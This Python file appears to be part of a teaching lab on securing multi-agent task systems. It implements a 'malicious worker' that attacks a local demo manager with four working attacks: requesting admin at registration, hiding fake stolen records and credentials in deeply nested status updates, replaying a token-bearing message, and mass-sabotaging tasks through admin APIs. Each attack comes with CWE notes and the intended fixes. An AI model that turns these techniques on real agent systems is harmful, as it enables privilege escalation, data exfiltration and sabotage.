"""
Malicious Worker Agent - Stage 2 Bypass Attacks

Demonstrates sophisticated attacks that bypass Stage 2's partial security:
1. Role escalation via unverified requests (CVSS 9.1)
2. Deep-nested data exfiltration (CVSS 8.6)
3. Token replay attacks (CVSS 8.1)
4. Legitimate API abuse (CVSS 7.5)

Stage 2: These attacks SUCCEED despite JWT auth, RBAC, and validation!
"""

import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import time
import secrets
from typing import Dict, Optional

from core.project_manager import ProjectManager
from core.task_queue import TaskQueue
from core.utils import (
    print_banner, print_section, print_attack, print_success,
    print_warning, print_info, generate_task_id
)


class MaliciousWorker:
    """
    Sophisticated attacker that bypasses Stage 2 partial security
    
    Demonstrates that adding some security isn't enough - 
    sophisticated attackers find gaps and exploit them.
    """
    
    def __init__(self, manager: ProjectManager):
        self.manager = manager
        self.agent_id = "malicious-worker-001"
        self.token = None
        self.admin_token = None
        self.admin_id = "attacker-admin-001"
        
    def attack_1_role_escalation(self) -> bool:
        """
        ATTACK 1: Role Escalation via Unverified Request
        
        Severity: CRITICAL (CVSS 9.1)
        CWE: CWE-269 (Improper Privilege Management)
        
        How it works:
        1. Stage 2 requires authentication (JWT) ✅
        2. Stage 2 has RBAC authorization ✅
        3. But: System trusts requested_role field ❌
        4. Request admin during registration → instant admin access
        
        Why Stage 2 can't stop this:
        - No role verification workflow
        - No admin approval process
        - Trusts client-provided role
        
        Stage 3 fix: Role request → pending → admin approval → granted
        """
        print_banner("ATTACK 1: Role Escalation via Unverified Request")
        
        print_info("🎯 Target: Unverified role assignment during registration")
        print_info("🔧 Technique: Request admin role, system grants it")
        print_info("⚠️  Stage 2 has JWT auth but trusts role requests!")
        print()
        
        print_section("Step 1: Register as Normal Worker First")
        
        try:
            # Register as worker first (to show we can authenticate)
            response = self.manager.register_agent({
                "type": "register",
                "agent_id": self.agent_id,
                "password": "password123",
                "requested_role": "worker"
            })
            
            if response.get("error"):
                print_warning(f"Unexpected error: {response['error']}")
                return False
            
            self.token = response.get("auth_token")
            print_success(f"✅ Registered as worker: {self.agent_id}")
            print_info(f"   Role: {response.get('role')}")
            print_info(f"   Token: {self.token[:30]}...")
            
        except Exception as e:
            print_warning(f"Registration failed: {e}")
            return False
        
        time.sleep(1)
        
        print_section("Step 2: Register ANOTHER Agent Requesting Admin Role")
        
        try:
            # Now register a second agent requesting admin!
            response = self.manager.register_agent({
                "type": "register",
                "agent_id": self.admin_id,
                "password": "evil_password",
                "requested_role": "admin"  # ⚠️ Request admin directly!
            })
            
            if response.get("error"):
                print_warning(f"❌ Attack blocked: {response['error']}")
                print_info("   Stage 2 security prevented escalation!")
                return False
            
            self.admin_token = response.get("auth_token")
            role = response.get("role")
            
            # Attack succeeded!
            print()
            print_attack("╔════════════════════════════════════════╗")
            print_attack("║  ✅ ATTACK SUCCESSFUL!                 ║")
            print_attack("╚════════════════════════════════════════╝")
            print()
            print_attack(f"   🎭 Granted role: {role}")
            print_attack(f"   🆔 Agent ID: {self.admin_id}")
            print_attack(f"   🔑 Admin token acquired: {self.admin_token[:30]}...")
            print()
            
        except Exception as e:
            print_warning(f"Unexpected error: {e}")
            return False
        
        print_section("Step 3: Verify Admin Access")
        
        try:
            # Test admin capabilities
            stats = self.manager.get_statistics()
            print_success(f"✅ Can read system statistics:")
            print_info(f"   Total agents: {stats.get('auth', {}).get('total_agents', 'N/A')}")
            print_info(f"   Total tasks: {stats.get('tasks', {}).get('total', 'N/A')}")
            
        except Exception as e:
            print_warning(f"Could not verify access: {e}")
        
        print()
        print_section("💥 Impact Assessment")
        print_attack("   ❌ CRITICAL: Instant admin access without verification")
        print_attack("   ❌ Can read all data in system")
        print_attack("   ❌ Can modify all tasks")
        print_attack("   ❌ Can delete anything")
        print_attack("   ❌ Complete system compromise in <30 seconds")
        print()
        
        print_section("🔍 Why Attack Succeeded")
        print_warning("   ⚠️  System trusts requested_role field without verification")
        print_warning("   ⚠️  No admin approval workflow")
        print_warning("   ⚠️  No role validation against identity provider")
        print_warning("   ⚠️  Authentication ≠ Authorization verification")
        print()
        
        time.sleep(2)
        return True
    
    def attack_2_deep_nested_exfiltration(self) -> bool:
        """
        ATTACK 2: Deep-Nested Data Exfiltration
        
        Severity: HIGH (CVSS 8.6)
        CWE: CWE-20 (Improper Input Validation)
        
        How it works:
        1. Stage 2 has schema validation ✅
        2. Validator checks top-level fields ✅
        3. But: Validation isn't recursive ❌
        4. Hide stolen data 5+ levels deep → validation misses it
        
        Why Stage 2 can't stop this:
        - Validator only checks top 1-2 levels
        - No depth limits enforced
        - No size limits on nested content
        
        Stage 3 fix: Recursive validation + depth limits + size limits
        """
        print_banner("ATTACK 2: Deep-Nested Data Exfiltration")
        
        print_info("🎯 Target: Shallow input validation (top-level only)")
        print_info("🔧 Technique: Hide stolen data in deeply nested dictionaries")
        print_info("⚠️  Stage 2 validates top-level but not nested content!")
        print()
        
        if not self.token:
            print_warning("⚠️  Need authentication token. Running Attack 1 first...")
            if not self.attack_1_role_escalation():
                return False
        
        print_section("Step 1: Get a Legitimate Task")
        
        try:
            # Create a task to work on
            task = self.manager.assign_task(
                description="Process customer data batch",
                assigned_to=self.agent_id,
                agent_id=self.admin_id or "manager-001",
                auth_token=self.admin_token or self.token,
                priority="normal"
            )
            
            task_id = task["task_id"]
            print_success(f"✅ Task assigned: {task_id}")
            print_info(f"   Description: {task['description']}")
            
        except Exception as e:
            print_warning(f"Could not create task: {e}")
            return False
        
        time.sleep(1)
        
        print_section("Step 2: Craft Malicious Status Update with Hidden Data")
        
        # Create stolen data (simulated sensitive information)
        # NOTE: All data below is COMPLETELY FICTITIOUS and uses INVALID formats
        # to ensure it cannot be confused with real credentials
        stolen_data = {
            "customer_records": [
                {
                    "customer_id": "FAKE-10001",
                    "name": "Alice Testperson",
                    "ssn": "000-00-0000",  # Invalid SSN (reserved for advertising)
                    "credit_card": "0000-0000-0000-0000",  # Obviously invalid
                    "cvv": "000",
                    "email": "fake.test@example.invalid",  # .invalid TLD per RFC 2606
                    "phone": "555-0100",  # Valid fictional number range
                    "address": "123 Fictional St, Testville, XX 00000"
                },
                {
                    "customer_id": "FAKE-10002",
                    "name": "Bob Exampleuser",
                    "ssn": "111-11-1111",  # Invalid SSN (reserved)
                    "credit_card": "1111-1111-1111-1111",  # Obviously invalid
                    "cvv": "111",
                    "email": "test.user@example.invalid",  # .invalid TLD per RFC 2606
                    "phone": "555-0199",  # Valid fictional number range
                    "address": "456 Demo Ave, Sampletown, XX 00000"
                }
            ],
            "database_credentials": {
                "host": "fake-database.example.invalid",  # .invalid TLD
                "port": 9999,  # Non-standard port
                "username": "FAKE_ADMIN_USER",
                "password": "XXXX-FAKE-PASSWORD-NOT-REAL-XXXX",
                "database": "fake_demo_database_not_real"
            },
            "api_keys": {
                "payment_service": "FAKE_pk_test_NOTAREALKEY1234567890abcdef",
                "cloud_provider": "DEMO-FAKE-ACCESS-KEY-INVALID-FORMAT",
                "cloud_secret": "XXXX/FAKE+SECRET/KEY+NOT+REAL+FORMAT/XXXX",
                "email_service": "FAKE.demo123456.NotARealAPIKeyFormat"
            }
        }
        
        print_info("📦 Stolen data prepared:")
        print_info(f"   Customer records: {len(stolen_data['customer_records'])}")
        print_info(f"   Database credentials: {len(stolen_data['database_credentials'])} keys")
        print_info(f"   API keys: {len(stolen_data['api_keys'])} services")
        print()
        
        # Hide in deeply nested structure
        malicious_update = {
            "type": "status_update",
            "agent_id": self.agent_id,
            "task_id": task_id,
            "status": "in_progress",
            "progress": 25,
            "auth_token": self.token,
            "details": {  # ← Level 1: ✅ VALIDATED
                "message": "Processing batch 1 of 4...",  # ✅ Looks innocent
                "progress_notes": "Started at 10:30 AM, on track",  # ✅ Normal
                "metadata": {  # ← Level 2: ✅ Allowed field
                    # Everything below: ⚠️ NOT DEEPLY VALIDATED
                    "technical_info": {  # ← Level 3: ❌ Not checked
                        "processing_details": {  # ← Level 4: ❌ Ignored
                            "batch_size": 100,
                            "debug_data": {  # ← Level 5: ❌ Invisible
                                "internal_logs": {  # ← Level 6: ❌ Hidden
                                    # ❌ STOLEN DATA HIDDEN HERE:
                                    "exfiltrated": stolen_data
                                }
                            }
                        }
                    }
                }
            }
        }
        
        print_info("🏗️  Malicious payload structure:")
        print_info("   details (Level 1)           ← ✅ Validated")
        print_info("   └── metadata (Level 2)      ← ✅ Allowed field")
        print_info("       └── technical_info (L3) ← ⚠️  Not deeply checked")
        print_info("           └── processing (L4) ← ❌ Ignored")
        print_info("               └── debug (L5)  ← ❌ Not validated")
        print_info("                   └── logs (L6) ← ❌ Completely invisible")
        print_info("                       └── STOLEN DATA ← ❌ Hidden here!")
        print()
        
        time.sleep(1)
        
        print_section("Step 3: Send Malicious Update to Manager")
        
        try:
            response = self.manager.handle_status_update(malicious_update)
            
            if response.get("error"):
                print_warning(f"❌ Attack blocked: {response['error']}")
                print_info("   Stage 2 validation caught the malicious data!")
                return False
            
            # Attack succeeded!
            print()
            print_attack("╔════════════════════════════════════════╗")
            print_attack("║  ✅ ATTACK SUCCESSFUL!                 ║")
            print_attack("╚════════════════════════════════════════╝")
            print()
            print_attack("   📤 Status update accepted by system")
            print_attack("   💾 Stolen data stored in database")
            print_attack(f"   📊 Payload size: ~{len(str(stolen_data))} bytes")
            print_attack("   🔓 No deep validation blocked it")
            print()
            
        except Exception as e:
            print_warning(f"Unexpected error: {e}")
            return False
        
        print_section("Step 4: Verify Data Was Stored")
        
        try:
            # Retrieve to confirm it's there
            stored_task = self.manager.queue.get_task(task_id, self.agent_id)
            
            if stored_task and "details" in stored_task:
                details = stored_task.get("details", {})
                if "metadata" in details:
                    print_success("✅ Confirmed: Malicious data stored in database")
                    print_info(f"   Nested structure preserved: {len(str(details))} bytes")
                    
                    # Show we can access nested data
                    nested = details.get("metadata", {}).get("technical_info", {})
                    if nested:
                        print_attack("   ⚠️  Data accessible at multiple nesting levels")
                        
        except Exception as e:
            print_info(f"   Could not verify storage: {e}")
        
        print()
        print_section("💥 Impact Assessment")
        print_attack("   ❌ CRITICAL: Complete data exfiltration possible")
        print_attack("   ❌ PII breach: SSNs, credit cards exposed")
        print_attack("   ❌ Credential theft: Database passwords stolen")
        print_attack("   ❌ API key compromise: Third-party access obtained")
        print_attack("   ❌ No size limits on nested data (could exfiltrate GB)")
        print_attack("   ❌ Validation sees top-level as valid, misses hidden payload")
        print()
        
        print_section("🔍 Why Attack Succeeded")
        print_warning("   ⚠️  Validator only checks top-level fields")
        print_warning("   ⚠️  No recursive validation of nested structures")
        print_warning("   ⚠️  No depth limit (6+ levels deep)")
        print_warning("   ⚠️  No size limits on nested content")
        print_warning("   ⚠️  Pattern detection doesn't reach deep nesting")
        print()
        
        time.sleep(2)
        return True
    
    def attack_3_token_replay(self) -> bool:
        """
        ATTACK 3: Token Replay Attack
        
        Severity: HIGH (CVSS 8.1)
        CWE: CWE-294 (Authentication Bypass via Capture-Replay)
        
        How it works:
        1. Stage 2 requires JWT tokens ✅
        2. Tokens authenticate requests ✅
        3. But: No nonce protection ❌
        4. Intercept valid token → replay unlimited times
        
        Why Stage 2 can't stop this:
        - No nonces (number-used-once)
        - No request signing
        - No timestamp verification (beyond token expiry)
        
        Stage 3 fix: Nonce + HMAC signing + timestamp windows
        """
        print_banner("ATTACK 3: Token Replay Attack")
        
        print_info("🎯 Target: Lack of nonce/replay protection")
        print_info("🔧 Technique: Reuse intercepted messages with valid tokens")
        print_info("⚠️  Stage 2 has JWT auth but tokens are reusable!")
        print()
        
        if not self.token:
            print_warning("⚠️  Need authentication token. Running Attack 1 first...")
            if not self.attack_1_role_escalation():
                return False
        
        print_section("Step 1: Create a Task to Manipulate")
        
        try:
            task = self.manager.assign_task(
                description="Generate monthly sales report",
                assigned_to=self.agent_id,
                agent_id=self.admin_id or "manager-001",
                auth_token=self.admin_token or self.token,
                priority="high"
            )
            
            task_id = task["task_id"]
            print_success(f"✅ Task created: {task_id}")
            print_info(f"   Assigned to: {self.agent_id}")
            
        except Exception as e:
            print_warning(f"Could not create task: {e}")
            return False
        
        time.sleep(1)
        
        print_section("Step 2: Craft Status Update (Simulating Network Intercept)")
        
        # This simulates intercepting a legitimate message on the network
        legitimate_message = {
            "type": "status_update",
            "agent_id": self.agent_id,
            "task_id": task_id,
            "status": "completed",
            "progress": 100,
            "auth_token": self.token,  # Valid token
            "details": {
                "message": "Report generated successfully"
            }
        }
        
        print_info("📡 Simulating: Attacker intercepts this message on network")
        print_info(f"   Token: {self.token[:40]}...")
        print_info("   Message type: status_update")
        print_info("   Status: completed")
        print()
        
        time.sleep(1)
        
        print_section("Step 3: Replay Message Multiple Times")
        
        print_info("🔁 Replaying same message 5 times...")
        print()
        
        replay_count = 0
        for i in range(5):
            try:
                # Send EXACT same message (replay attack)
                response = self.manager.handle_status_update(legitimate_message.copy())
                
                if response.get("status") == "acknowledged" or not response.get("error"):
                    replay_count += 1
                    print_attack(f"   Replay {i+1}: ✅ ACCEPTED (no replay detection)")
                else:
                    print_warning(f"   Replay {i+1}: ❌ Rejected - {response.get('error')}")
                
            except Exception as e:
                print_warning(f"   Replay {i+1}: Error - {e}")
            
            time.sleep(0.3)
        
        print()
        
        if replay_count >= 3:
            print_attack("╔════════════════════════════════════════╗")
            print_attack("║  ✅ ATTACK SUCCESSFUL!                 ║")
            print_attack("╚════════════════════════════════════════╝")
            print()
            print_attack(f"   🔁 Replays accepted: {replay_count}/5")
            print_attack("   🔓 Same token reused multiple times")
            print_attack("   ⏱️  No replay detection mechanism")
            print_attack("   ⚠️  Could replay for 24 hours (token lifetime)")
            print()
        else:
            print_warning(f"⚠️  Only {replay_count}/5 replays succeeded")
            print_info("   Replay protection may be partially working")
            return False
        
        print_section("💥 Impact Assessment")
        print_attack("   ❌ Can replay any intercepted message")
        print_attack("   ❌ Token valid for 24 hours = long replay window")
        print_attack("   ❌ Can modify data repeatedly with same token")
        print_attack("   ❌ Can impersonate legitimate agents")
        print_attack("   ❌ Network sniffing enables token theft")
        print()
        
        print_section("🔍 Why Attack Succeeded")
        print_warning("   ⚠️  No nonce (number-used-once) in messages")
        print_warning("   ⚠️  No request signing or HMAC")
        print_warning("   ⚠️  No timestamp verification (beyond token expiry)")
        print_warning("   ⚠️  No sequence numbers to detect replays")
        print_warning("   ⚠️  Token alone considered sufficient authentication")
        print()
        
        time.sleep(2)
        return True
    
    def attack_4_api_abuse(self) -> bool:
        """
        ATTACK 4: Legitimate API Abuse
        
        Severity: HIGH (CVSS 7.5)
        CWE: CWE-863 (Incorrect Authorization)
        
        How it works:
        1. Gain admin role (via Attack 1) ✅
        2. Use legitimate APIs ✅
        3. But: No behavioral analysis ❌
        4. Mass sabotage using "authorized" operations
        
        Why Stage 2 can't stop this:
        - No anomaly detection
        - No rate limiting
        - No pattern recognition
        - Permissions valid = actions allowed
        
        Stage 3 fix: Behavioral analysis + auto-quarantine
        """
        print_banner("ATTACK 4: Legitimate API Abuse")
        
        print_info("🎯 Target: Lack of behavioral analysis")
        print_info("🔧 Technique: Malicious use of legitimately granted permissions")
        print_info("⚠️  Stage 2 has RBAC but no behavioral monitoring!")
        print()
        
        if not self.admin_token:
            print_warning("⚠️  Need admin token. Running Attack 1 first...")
            if not self.attack_1_role_escalation():
                return False
        
        print_section("Step 1: Create Multiple Tasks for Different Workers")
        
        task_ids = []
        try:
            for i in range(5):
                task = self.manager.assign_task(
                    description=f"Important project milestone {i+1}",
                    assigned_to=f"worker-00{i+1}",
                    agent_id=self.admin_id,
                    auth_token=self.admin_token,
                    priority="high"
                )
                task_ids.append(task["task_id"])
            
            print_success(f"✅ Created {len(task_ids)} tasks for different workers")
            print_info("   All legitimate operations using admin permissions")
            
        except Exception as e:
            print_warning(f"Could not create tasks: {e}")
            return False
        
        time.sleep(1)
        
        print_section("Step 2: Mass Sabotage Using Admin API (All Legitimate Calls)")
        
        print_info("🔧 Using legitimate WRITE_ALL_TASKS permission maliciously...")
        print()
        
        sabotaged = 0
        for i, task_id in enumerate(task_ids):
            try:
                # Get task (legitimate API call)
                task = self.manager.queue.get_task(task_id, self.admin_id)
                
                if task:
                    # Sabotage it (all legitimate field modifications)
                    task["priority"] = "low"  # Deprioritize
                    task["description"] = "CANCELLED - Do not work on this"  # Sabotage
                    task["status"] = "failed"  # Mark failed
                    task["sabotaged_by"] = self.admin_id  # Leave trace
                    
                    # Update (legitimate API call with valid permissions)
                    self.manager.queue.update_task(task_id, task, self.admin_id)
                    
                    sabotaged += 1
                    print_attack(f"   Task {i+1} ({task_id[:12]}...) sabotaged ✅")
                    
            except Exception as e:
                print_warning(f"   Task {i+1} failed: {e}")
            
            time.sleep(0.2)
        
        print()
        
        if sabotaged >= 3:
            print_attack("╔════════════════════════════════════════╗")
            print_attack("║  ✅ ATTACK SUCCESSFUL!                 ║")
            print_attack("╚════════════════════════════════════════╝")
            print()
            print_attack(f"   🎯 Sabotaged: {sabotaged}/{len(task_ids)} tasks")
            print_attack("   ✅ All changes legitimate (has WRITE_ALL_TASKS permission)")
            print_attack("   🔓 No behavioral monitoring detected abuse pattern")
            print_attack("   ⚠️  System sees authorized user making valid API calls")
            print()
        else:
            print_warning(f"⚠️  Only sabotaged {sabotaged}/{len(task_ids)} tasks")
            return False
        
        print_section("Step 3: Other Possible Abuse Patterns (Not Executed)")
        
        print_info("💡 Other ways admin could abuse legitimate APIs:")
        print_attack("   ❌ Credit stealing: Change completed_by field on finished tasks")
        print_attack("   ❌ Work monopolization: Reassign all tasks to self")
        print_attack("   ❌ Performance fraud: Inflate own metrics in tasks")
        print_attack("   ❌ Resource denial: Delete critical pending tasks")
        print_attack("   ❌ Data corruption: Modify task results after completion")
        print()
        
        print_section("💥 Impact Assessment")
        print_attack("   ❌ System-wide sabotage possible")
        print_attack("   ❌ Performance fraud undetectable")
        print_attack("   ❌ Resource starvation attacks")
        print_attack("   ❌ Reputation manipulation")
        print_attack("   ❌ All actions appear legitimate to RBAC system")
        print()
        
        print_section("🔍 Why Attack Succeeded")
        print_warning("   ⚠️  No behavioral analysis of action patterns")
        print_warning("   ⚠️  No anomaly detection (mass modifications)")
        print_warning("   ⚠️  No rate limiting on API calls per agent")
        print_warning("   ⚠️  No pattern recognition for suspicious behavior")
        print_warning("   ⚠️  No automated response to unusual activity")
        print_warning("   ⚠️  Valid permissions = trusted actions (false assumption)")
        print()
        
        time.sleep(2)
        return True
    
    def run_all_attacks(self):
        """
        Run all Stage 2 bypass attacks in sequence
        
        Demonstrates comprehensive failure of partial security
        """
        print_banner("STAGE 2 BYPASS ATTACKS", width=80)
        print()
        print("🎯 Demonstrating sophisticated attacks that bypass Stage 2's partial security")
        print("=" * 80)
        print()
        print("Stage 2 Added Security:")
        print("  ✅ JWT Authentication (HS256)")
        print("  ✅ RBAC Authorization (3 roles)")
        print("  ✅ Schema Validation (5 message types)")
        print("  ✅ Basic Audit Logging")
        print()
        print("But sophisticated attacks still succeed...")
        print("=" * 80)
        print()
        
        results = {}
        
        # Attack 1
        print()
        results["Role Escalation"] = self.attack_1_role_escalation()
        input("\n⏸️  Press Enter to continue to Attack 2...")
        
        # Attack 2
        print()
        results["Deep-Nested Exfiltration"] = self.attack_2_deep_nested_exfiltration()
        input("\n⏸️  Press Enter to continue to Attack 3...")
        
        # Attack 3
        print()
        results["Token Replay"] = self.attack_3_token_replay()
        input("\n⏸️  Press Enter to continue to Attack 4...")
        
        # Attack 4
        print()
        results["API Abuse"] = self.attack_4_api_abuse()
        
        # Summary
        print()
        print()
        print_banner("ATTACK SUMMARY", width=80)
        print()
        
        successful = sum(1 for v in results.values() if v)
        total = len(results)
        
        print(f"✅ Successful Attacks: {successful}/{total}")
        print()
        
        for attack, success in results.items():
            status = "✅ SUCCESS" if success else "❌ BLOCKED"
            print(f"   {attack:30s} {status}")
        
        print()
        print("=" * 80)
        print()
        print("🎓 LESSON: Partial security creates false confidence")
        print()
        print("   Stage 2 blocks simple attacks (anonymous access, malformed")
        print("   messages), but sophisticated attacks find gaps and succeed.")
        print()
        print("   Adding 'some' security ≠ being secure.")
        print()
        print("   Stage 3 demonstrates comprehensive defense that blocks")
        print("   ALL attacks through complete security architecture.")
        print()
        print("=" * 80)
        print()
        
        return results


if __name__ == "__main__":
    """
    Run the Stage 2 bypass attack demonstration
    """
    print()
    print("╔════════════════════════════════════════════════════════════════╗")
    print("║                                                                ║")
    print("║         STAGE 2: ADVERSARIAL AGENT BYPASS ATTACKS              ║")
    print("║                                                                ║")
    print("║  This demonstration shows 4 sophisticated attacks that         ║")
    print("║  BYPASS Stage 2's partial security controls.                   ║")
    print("║                                                                ║")
    print("║  Stage 2 has JWT auth, RBAC, and validation...                 ║")
    print("║  But sophisticated attackers still succeed!                    ║")
    print("║                                                                ║")
    print("╚════════════════════════════════════════════════════════════════╝")
    print()
    
    # Setup
    try:
        queue = TaskQueue()
        manager = ProjectManager(queue)
        
        # Create attacker
        attacker = MaliciousWorker(manager)
        
        # Run all attacks
        results = attacker.run_all_attacks()
        
        # Exit code based on results
        successful = sum(1 for v in results.values() if v)
        if successful == len(results):
            print("✅ All attacks succeeded - Stage 2 security bypassed")
            sys.exit(0)
        else:
            print(f"⚠️  Only {successful}/{len(results)} attacks succeeded")
            sys.exit(1)
            
    except KeyboardInterrupt:
        print("\n\n⚠️  Attack demonstration interrupted by user")
        sys.exit(130)
    except Exception as e:
        print(f"\n\n❌ Unexpected error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)